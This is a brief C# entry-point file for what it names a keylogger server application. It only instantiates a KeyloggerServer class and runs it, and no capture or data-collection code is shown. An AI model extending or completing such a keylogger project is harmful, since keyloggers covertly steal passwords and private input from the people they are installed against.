using ServerCore;

/// <summary>
/// Entry point for the keylogger server application.
/// </summary>
class Program
{
    /// <summary>
    /// The main asynchronous entry method that starts the keylogger server.
    /// </summary>
    /// <returns>A Task representing the asynchronous operation.</returns>
    static async Task Main()
    {
        var server = new KeyloggerServer();
        await server.RunAsync();
    }
}
